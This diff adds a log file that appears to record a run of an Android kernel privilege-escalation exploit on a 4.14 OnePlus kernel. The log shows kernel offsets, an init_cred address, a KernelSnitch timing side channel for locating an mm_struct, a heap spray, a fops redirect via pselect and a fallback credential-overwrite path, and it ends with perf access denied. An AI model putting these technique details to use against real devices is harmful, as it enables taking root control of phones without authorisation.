@@ -1,0 +1,109 @@
+[*] kernel: 4.14.116
+[+] offsets matched: 4.14.116
+[*] init_cred image=ffffff800aebc9a8 alias=ffffffff82ebc9a8
+[+] startup context pid=8342 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[+] startup limits pid=8342 NoNewPrivs=0 Seccomp=0 Seccomp_filters=?
+[+] build config pid=8342 label=ghostlock_oneplus slide=pselect main=pselect
+[+] p0 profile pid=8342 phys_offset=0000000080000000 kernel_phys_load=0000000000080000 delta=ffffffff80080000 slide_logger=ffffff802a4021a0 bootid_data=ffffff802a6aa868 init_task=ffffff802a40cf00 root_tg=ffffff802a63d580 sysctl_bootid=ffffff802a6aa868
+[*] p0 kernel_phys_load=0000000000080000 phys_offset=0000000080000000 delta=ffffffff80080000
+[*] [T+0ms] exploit start
+[*] UMH path: fops redirect (mode=4)...
+[*] [T+1238ms] pre-UMH drain
+[*] === fops redirect === target=0xffffffff8303e378 mode=4
+[*] [T+1239ms]   heap spray start
+[*] KernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[*] parameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[*] KernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[*] start finding collisisons
+[*] target    0000007d40c4f0c8
+[*] pass1 slow candidates: 1443
+[*]   0000006d402f24e8 t1=195 t2=1562
+[*]   0000006d40335700 t1=455 t2=1366
+[*]   0000006d4051a628 t1=65 t2=1366
+[*]   0000006d405306d8 t1=521 t2=521
+[*]   0000006d405abab0 t1=65 t2=1562
+[*]   0000006d40608d98 t1=325 t2=650
+[*]   0000006d40659020 t1=325 t2=651
+[*]   0000006d406a4278 t1=390 t2=586
+[*]   0000006d406bc338 t1=390 t2=1562
+[*]   0000006d40705580 t1=390 t2=1236
+[*]   0000006d40784978 t1=325 t2=1562
+[*]   0000006d407bfb50 t1=260 t2=520
+[*]   0000006d407ddc40 t1=325 t2=1366
+[*]   0000006d407f1ce0 t1=455 t2=390
+[*]   0000006d407f7d10 t1=195 t2=520
+[*]   0000006d4080fdd0 t1=522265 t2=0
+[*]   0000006d40814df8 t1=130 t2=520
+[*]   0000006d4084afa8 t1=65 t2=520
+[*]   0000006d408db430 t1=500520 t2=0
+[*]   0000006d40ab32f0 t1=390 t2=0
+[*]   0000006d40adb430 t1=130 t2=520
+[*]   0000006d40af44f8 t1=455 t2=520
+[*]   0000006d40c44f78 t1=195 t2=520
+[*]   0000006d40c9a228 t1=390 t2=520
+[*]   0000006d40cf9520 t1=390 t2=520
+[*]   0000006d40d8e9c8 t1=130 t2=520
+[*]   0000006d40db5b00 t1=520 t2=520
+[*]   0000006d40f84978 t1=520 t2=520
+[*]   0000006d4108b1b0 t1=520 t2=0
+[*]   0000006d41203d70 t1=195 t2=520
+[*]   0000006d413c0b58 t1=195 t2=520
+[*]   0000006d413c1b60 t1=260 t2=520
+[*]   0000006d413e9ca0 t1=521 t2=0
+[*]   0000006d414740f8 t1=521 t2=0
+[*]   0000006d4153d740 t1=511849 t2=0
+[*]   0000006d415b5b00 t1=500781 t2=0
+[*]   0000006d41608d98 t1=520 t2=520
+[*]   0000006d41667090 t1=455 t2=520
+[*]   0000006d41688198 t1=455 t2=520
+[*]   0000006d416c4378 t1=390 t2=520
+[*]   0000006d416dc438 t1=390 t2=520
+[*]   0000006d417537f0 t1=520 t2=520
+[*]   0000006d417b7b10 t1=507812 t2=0
+[*]   0000006d417efcd0 t1=521 t2=0
+[*]   0000006d4182dec0 t1=130 t2=520
+[*]   0000006d41887190 t1=260 t2=520
+[*]   0000006d4195b830 t1=325 t2=520
+[*]   0000006d41d39720 t1=501432 t2=0
+[*]   0000006d41d718e0 t1=505598 t2=0
+[*]   0000006d41d728e8 t1=506510 t2=0
+[*]   0000006d41f18618 t1=521 t2=0
+[*]   0000006d41f5e848 t1=195 t2=0
+[*] found 15 collisisons
+[*] KernelSnitch collisions: found
+[*] start bruteforcing
+[*] [  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[*] [  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[*] [  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[*] [  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[*] [  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[*] [  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[*] [  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[*] [  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[*] KernelSnitch bruteforce: state=4 found=1 mm_struct=0xffffff81d4188780
+[*] [probe] base=ffffff81d4188000 payload_mode=0 entering skb payload[*] done
+[*] prepare_kernel_page ok attempt=1
+[*] [T+72803ms]   heap spray done
+[-] pselect cannot place tree_left waiter_word=2 global_word=-5 words_per_set=5 nfds=320
+[-] pselect cannot place pi_parent waiter_word=3 global_word=-4 words_per_set=5 nfds=320
+[-] pselect cannot place pi_right waiter_word=4 global_word=-3 words_per_set=5 nfds=320
+[-] pselect cannot place pi_left waiter_word=5 global_word=-2 words_per_set=5 nfds=320
+[-] pselect cannot place task waiter_word=6 global_word=-1 words_per_set=5 nfds=320
+[*] pselect route setup attempt=1 simple=0 shift=-7 page=ffffff81d4188000 fake_lock=ffffff81d4188000 fake_w0=ffffff81d4188300 fake_task=ffffff81d4188400 in0=ffffff81d4188000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
+[*] pselect pre-select +0ms
+[*] pselect post-select +200ms ret=0
+[*] pselect returned attempt=1 ret=0 errno=0 calls=1 success=1 delay=0
+[*] pselect route probing cfi attempt=1 ret=0 expected=9
+[*] cfi attempt=1 fd=6 path=/dev/ashmem fake_fops=ffffff81d4188100 target=ffffff81d4188380 ioctl=ffffff8008e05964 open=ffffff8008e054b4 write_iter=ffffff80085956e0
+[*] cfi write ret=-1 errno=22
+[*] pselect route done calls=1 success=1 step=1 errno=22
+[*] [T+74011ms]   PI route done
+[*] [T+74011ms] fops redirect done
+[*] selinux_enforcing absent (4.14 CDY) - unblocking perf instead of W1
+[*] UMH not available, falling back to W2 cred path
+[*] [T+75456ms] pre-W2 drain
+[!] perf_event_open failed errno=13
+[*] [T+75458ms] perf_find_task done
+[*] perf returned 0, retrying...
+[!] perf_event_open failed errno=13
+[!] Cannot find task_struct (perf blocked by seccomp?)
